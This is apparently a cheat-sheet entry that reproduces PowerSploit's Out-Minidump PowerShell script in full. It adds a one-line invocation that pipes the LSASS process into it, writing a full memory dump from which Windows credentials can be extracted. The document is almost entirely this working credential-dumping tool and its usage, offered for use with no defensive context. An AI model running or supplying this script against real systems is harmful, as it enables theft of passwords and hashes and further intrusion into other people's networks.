# Creating Minidumps
## Out-Minidump
Source: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1   
Use script with:   
`Get-Process -Name lsass | Out-Minidump`   

Code: (redacted from original)   
```
function Out-Minidump
{
[CmdletBinding()]
Param (
[Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
[System.Diagnostics.Process]
$Process,
 
[Parameter(Position = 1)]
[ValidateScript({ Test-Path $_ })]
[String]
$DumpFilePath = $PWD
)
 
BEGIN
{
$WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic')
$Flags = [Reflection.BindingFlags] 'NonPublic, Static'
$MnDmpWrtDmp = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags)
$MnDmpWithFullMemory = [UInt32] 2
}
 
PROCESS
{
$ProcessId = $Process.Id
$ProcessName = $Process.Name
$ProcessHandle = $Process.Handle
$ProcessFileName = "$($ProcessName)_$($ProcessId).dmp"
 
$ProcessDumpPath = Join-Path $DumpFilePath $ProcessFileName
 
$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]::Create)
 
$Result = $MnDmpWrtDmp.Invoke($null, @($ProcessHandle,
$ProcessId,
$FileStream.SafeFileHandle,
$MnDmpWithFullMemory,
[IntPtr]::Zero,
[IntPtr]::Zero,
[IntPtr]::Zero))
 
$FileStream.Close()
 
if (-not $Result)
{
$Exception = New-Object ComponentModel.Win32Exception
$ExceptionMessage = "$($Exception.Message) ($($ProcessName):$($ProcessId))"
 
Remove-Item $ProcessDumpPath -ErrorAction SilentlyContinue
 
throw $ExceptionMessage
}
else
{
Get-ChildItem $ProcessDumpPath
}
}
 
END {}
}
```
